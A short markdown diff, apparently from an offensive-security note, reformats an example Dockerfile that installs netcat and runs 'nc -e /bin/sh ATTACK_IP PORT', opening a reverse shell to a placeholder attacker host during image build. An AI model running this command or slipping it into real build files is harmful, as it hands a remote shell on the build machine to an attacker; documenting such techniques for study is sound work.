@@ -2,12 +2,16 @@
 
 ### Example dockerfile:
 
-#### FROM debian:jimmy-kekw
+#### 1) Dockerfile contents
 
-#### RUN apt-get update -y
+    FROM debian:jimmy-kekw
 
-#### RUN apt-get install netcat -y
+    RUN apt-get update -y
 
-#### RUN nc -e /bin/sh ATTACK_IP PORT
+    RUN apt-get install netcat -y
 
-#### docker build (Compile to image)
+    RUN nc -e /bin/sh ATTACK_IP PORT
+
+#### 2)  
+
+    docker build (Compile to image)
